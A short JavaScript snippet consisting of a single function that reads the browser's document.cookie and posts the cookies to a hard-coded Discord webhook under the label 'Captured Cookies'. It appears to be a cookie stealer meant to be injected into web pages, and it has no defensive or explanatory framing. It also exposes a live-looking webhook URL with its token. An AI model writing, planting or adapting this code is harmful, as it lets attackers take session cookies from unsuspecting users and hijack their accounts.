function captureCookies() {
  const cookies = document.cookie;
  // Send the cookies to the Discord webhook
  fetch("https://discord.com/api/webhooks/1319964377918476330/XMRPmI35tqN8Zoc3QxSwh3ugWYMDZyHCmceUk81sn4Jb-mSSsQZkrfuOfV0dpWUsL0cP", {
    method: "POST",
    body: JSON.stringify({
      content: `Captured Cookies:\n${cookies}`
    }),
    headers: {
      "Content-Type": "application/json"
    }
  });
}